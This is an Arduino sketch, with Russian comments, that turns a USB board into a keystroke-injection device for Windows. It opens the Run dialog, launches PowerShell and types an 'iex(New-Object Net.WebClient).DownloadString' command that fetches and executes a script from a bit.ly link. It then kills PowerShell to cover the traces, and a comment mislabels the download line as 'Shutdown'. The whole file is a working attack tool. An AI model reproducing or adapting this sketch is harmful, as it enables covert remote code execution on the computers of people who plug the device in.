#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);//Delay
  Keyboard.press(KEY_LEFT_GUI);//Кнопка win
  delay(500); 
  Keyboard.press('r');//Win+R
  delay(700); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("powershell"); // вызываем командную строку
  Keyboard.press(KEY_RETURN);//Enter
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.println("iex(New-Object Net.WebClient).DownloadString('http://bit.ly/3Ebh9BE')"); //Shutdown
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);  
  delay(6000);
  Keyboard.println("(Get-Process -Name powershell).Kill()");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  delay(500);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
}

void loop() {
}
